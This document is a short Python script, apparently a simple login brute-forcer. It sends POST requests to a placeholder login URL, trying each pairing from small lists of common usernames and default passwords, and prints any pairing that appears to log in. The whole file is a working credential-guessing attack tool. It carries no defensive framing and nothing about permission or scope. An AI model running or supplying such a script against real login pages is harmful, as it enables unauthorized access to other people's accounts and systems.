import requests

target_url = "http://example.com/login"
username_field = "username"
password_field = "password"

# Define a list of usernames and passwords to attempt
usernames = ["admin", "user", "test"]
passwords = ["admin", "password", "123456"]

# Iterate through each combination of username and password
for username in usernames:
    for password in passwords:
        # Send a POST request with the current combination
        data = {
            username_field: username,
            password_field: password
        }
        response = requests.post(target_url, data=data)
        
        # Check if the login attempt was successful
        if response.status_code == 200 and "logged in" in response.text:
            print(f"Successful login - Username: {username}, Password: {password}")
